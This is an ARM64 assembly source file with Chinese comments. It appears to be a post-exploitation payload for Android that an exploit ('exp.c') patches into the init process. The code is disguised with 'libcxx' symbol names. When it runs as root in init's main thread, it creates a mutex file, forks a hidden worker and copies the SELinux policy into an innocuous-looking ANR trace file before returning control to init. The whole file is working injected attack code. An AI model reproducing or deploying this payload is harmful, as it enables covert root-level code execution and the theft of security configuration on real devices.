.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"
policy_src:
    .asciz "/sys/fs/selinux/policy"
policy_dst:
    .asciz "/data/anr/anr_policy_trace.txt" 
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护 (保存所有关键寄存器)
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1 (确保是 init 的主线程)
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    tbnz    w0, #31, return

    sub     sp, sp, 16

    // 4. 准备 clone 参数
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // 5. clone 子进程
    mov     x8, SYS_clone
    add     x4, sp, 8
    mov     x3, xzr
    mov     x2, xzr
    mov     x1, xzr
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]
    add     sp, sp, 16

    // 父进程 (init) 收到子进程 pid，直接返回
    cbnz    w0, return          

// ── Worker 子进程 ──────────────────────────────────────────────────────
worker:
    // 分配 1024 字节作为读取缓冲区 (16字节对齐)
    sub     sp, sp, 1024

    // 6. 打开 /sys/fs/selinux/policy (只读)
    mov     x0, -100
    adr     x1, policy_src
    movl    x2, (O_RDONLY|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, cleanup_df
    mov     x20, x0  // 保存源文件 fd 到 x20

    // 7. 打开 /data/anr/anr_policy_trace.txt (写入、创建、截断)
    mov     x0, -100
    adr     x1, policy_dst
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    movl    x3, 0644
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, close_src
    mov     x21, x0  // 保存目标文件 fd 到 x21

read_loop:
    // 8. read(src_fd, sp, 1024)
    mov     x0, x20
    mov     x1, sp
    movl    x2, 1024
    mov     x8, #SYS_read
    svc     0
    
    cmp     w0, #0
    b.le    close_dst  // 如果读完了 (0) 或出错 (<0)，退出循环

    // 9. write(dst_fd, sp, 读到的字节数)
    mov     x22, x0
    mov     x0, x21
    mov     x1, sp
    mov     x2, x22
    mov     x8, #SYS_write
    svc     0
    
    b       read_loop

close_dst:
    mov     x0, x21
    mov     x8, #SYS_close
    svc     0

close_src:
    mov     x0, x20
    mov     x8, #SYS_close
    svc     0

cleanup_df:
    // 恢复栈指针 (极其关键，防止 init Panic)
    add     sp, sp, 1024

    // 强制删除 /dev/df (方便反复测试)
    mov     x0, -100
    adr     x1, mutex_file
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    // 子进程光荣退役
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    // 现场恢复
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

libcxx_first_inst_copy:
    // 供 exp.c 打补丁的占位符
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
